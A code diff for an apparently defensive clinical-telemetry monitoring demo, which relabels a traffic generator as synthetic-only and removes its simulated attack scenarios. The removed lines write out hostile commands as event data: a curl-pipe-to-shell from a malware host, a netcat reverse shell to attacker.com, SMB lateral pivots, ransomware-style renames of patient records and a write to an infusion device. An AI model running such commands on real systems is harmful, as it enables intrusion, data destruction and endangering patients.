@@ -1,8 +1,9 @@
 """
-SentinelCloud Live Telemetry & Attack Generator
-================================================
-Generates continuous, realistic clinical microservice telemetry at variable rates,
-and executes periodic cyber-attack scenarios at variable intervals.
+SentinelCloud Synthetic Baseline Generator
+==========================================
+Honest SYNTHETIC-labelled warm-up events for the online HalfSpaceTrees model
+during cold-start. Real telemetry comes from LogTailIngester (tailed Flask
+JSON access logs). Attack injection is via PC2 / testing/scenarios only.
 """
 
 import time
@@ -118,32 +119,32 @@ CLINICAL_EVENTS = [
 
 
 class LiveTrafficGenerator:
-    """Generates continuous live clinical telemetry and executes periodic attacks."""
+    """
+    Synthetic baseline warm-up generator.
+
+    Honest role: emits SYNTHETIC-labelled baseline events during the HMM's
+    cold-start period so the online HalfSpaceTrees model has an initial
+    distribution. Real telemetry comes from LogTailIngester (tailed Flask
+    JSON access logs). Manual attack injection is via PC2 / testing/scenarios.
+    Auto-attacks were removed — this generator emits baseline only.
+    """
 
     def __init__(self, pipeline):
         self.pipeline = pipeline
         self.running = False
         self.thread: Optional[threading.Thread] = None
 
-        # Attack interval configuration (auto-attacks disabled per user request)
-        self.enable_auto_attacks = False
-        self.min_attack_interval = 45.0
-        self.max_attack_interval = 80.0
-        self.next_attack_interval = random.uniform(self.min_attack_interval, self.max_attack_interval)
-        self.last_attack_time = time.time()
-
     def start(self):
         if self.running:
             return
         self.running = True
-        self.last_attack_time = time.time()
         self.thread = threading.Thread(target=self._run_loop, daemon=True, name="LiveTrafficGenerator")
         self.thread.start()
-        logger.info("Live clinical telemetry generator started (automated demo attacks: OFF)")
+        logger.info("Synthetic baseline generator started (SYNTHETIC-labelled warm-up only)")
 
     def stop(self):
         self.running = False
-        logger.info("Live telemetry generator stopped")
+        logger.info("Synthetic baseline generator stopped")
 
     def _run_loop(self):
         # Initial warm-up delay
@@ -151,25 +152,7 @@ class LiveTrafficGenerator:
 
         while self.running:
             try:
-                now = time.time()
-
-                if self.enable_auto_attacks:
-                    time_since_attack = now - self.last_attack_time
-                    any_pod_under_attack = any(
-                        s.status in (ServiceStatus.DEGRADED, ServiceStatus.QUARANTINED, ServiceStatus.REDEPLOYING)
-                        for s in self.pipeline.services.values()
-                    )
-
-                    if time_since_attack >= self.next_attack_interval and not any_pod_under_attack:
-                        self._execute_random_attack()
-                        self.last_attack_time = time.time()
-                        self.next_attack_interval = random.uniform(self.min_attack_interval, self.max_attack_interval)
-                        logger.info("Next cyber-attack scheduled in ~%.1f seconds", self.next_attack_interval)
-                    else:
-                        self._emit_normal_event()
-                else:
-                    # Emit normal clinical telemetry event only
-                    self._emit_normal_event()
+                self._emit_normal_event()
 
                 # Variable rate: sleep between 1.2s and 2.8s
                 sleep_time = random.uniform(1.2, 2.8)
@@ -180,7 +163,7 @@ class LiveTrafficGenerator:
                 time.sleep(2.0)
 
     def _emit_normal_event(self):
-        """Emit a realistic normal clinical event."""
+        """Emit a synthetic baseline warm-up event (clearly labelled SYNTHETIC)."""
         template = random.choice(CLINICAL_EVENTS)
         # Avoid emitting normal events to a pod currently undergoing quarantine/redeploy
         pod_status = self.pipeline.services.get(template["pod_name"])
@@ -189,7 +172,7 @@ class LiveTrafficGenerator:
 
         event = TelemetryEvent(
             source=TelemetrySource.HTTP_INGESTION,
-            data_mode=DataMode.LIVE,
+            data_mode=DataMode.SYNTHETIC,
             pod_name=template["pod_name"],
             namespace="medical",
             syscall_name=template["syscall_name"],
@@ -200,113 +183,3 @@ class LiveTrafficGenerator:
             params=template["params"],
         )
         self.pipeline.process_event(event)
-
-    def _execute_random_attack(self):
-        """Execute a multi-stage cyber attack scenario."""
-        scenario_choice = random.choice(["ransomware_ehr", "lateral_billing", "firmware_dispenser"])
-        logger.warning(">>> LAUNCHING PERIODIC CYBER-ATTACK SCENARIO: %s <<<", scenario_choice)
-
-        if scenario_choice == "ransomware_ehr":
-            self._attack_ransomware_ehr()
-        elif scenario_choice == "lateral_billing":
-            self._attack_lateral_billing()
-        else:
-            self._attack_firmware_dispenser()
-
-    def _attack_ransomware_ehr(self):
-        """Multi-stage ransomware kill-chain on EHR pod."""
-        # Stage 1: Spawn unauthorized shell
-        ev1 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="ehr",
-            namespace="medical",
-            syscall_name="sys_execve",
-            binary="/bin/bash",
-            target="",
-            params={"argv": ["/bin/bash", "-c", "curl -s http://malware.darknet.ru/drop.sh | sh"]},
-        )
-        self.pipeline.process_event(ev1)
-        time.sleep(1.2)
-
-        # Stage 2: Encrypt database records (.locked)
-        ev2 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="ehr",
-            namespace="medical",
-            syscall_name="sys_rename",
-            binary="/bin/mv",
-            target="/data/patient_records.db.locked",
-            params={"old_path": "/data/patient_records.db", "new_path": "/data/patient_records.db.locked"},
-        )
-        self.pipeline.process_event(ev2)
-        time.sleep(1.2)
-
-        # Stage 3: Lateral SMB pivot
-        ev3 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="ehr",
-            namespace="medical",
-            syscall_name="sys_connect",
-            binary="/usr/bin/smbclient",
-            target="billing:445",
-            port=445,
-            protocol="tcp",
-            params={"share": "C$"},
-        )
-        self.pipeline.process_event(ev3)
-
-    def _attack_lateral_billing(self):
-        """Lateral movement and unauthorized access on Billing pod."""
-        # Stage 1: Unauthorized command execution
-        ev1 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="billing",
-            namespace="medical",
-            syscall_name="sys_execve",
-            binary="/bin/bash",
-            target="",
-            params={"argv": ["/bin/bash", "-c", "nc -e /bin/sh attacker.com 4444"]},
-        )
-        self.pipeline.process_event(ev1)
-        time.sleep(1.2)
-
-        # Stage 2: Lateral port 445 SMB pivot to drug dispenser
-        ev2 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="billing",
-            namespace="medical",
-            syscall_name="sys_connect",
-            binary="/usr/bin/smbclient",
-            target="drug-dispenser:445",
-            port=445,
-            protocol="tcp",
-            params={"share": "ADMIN$"},
-        )
-        self.pipeline.process_event(ev2)
-
-    def _attack_firmware_dispenser(self):
-        """Memory tamper and unauthorized device access on Drug Dispenser."""
-        # Stage 1: Unexpected shell
-        ev1 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="drug-dispenser",
-            namespace="medical",
-            syscall_name="sys_execve",
-            binary="/bin/bash",
-            target="",
-            params={"argv": ["/bin/bash", "-c", "echo 999 > /dev/ttyUSB0"]},
-        )
-        self.pipeline.process_event(ev1)
-        time.sleep(1.2)
-
-        # Stage 2: Device manipulation
-        ev2 = TelemetryEvent(
-            source=TelemetrySource.LAB_TEST,
-            pod_name="drug-dispenser",
-            namespace="medical",
-            syscall_name="sys_rename",
-            binary="/bin/mv",
-            target="/data/infusion_calibration.conf.locked",
-            params={"old_path": "/data/infusion_calibration.conf", "new_path": "/data/infusion_calibration.conf.locked"},
-        )
-        self.pipeline.process_event(ev2)
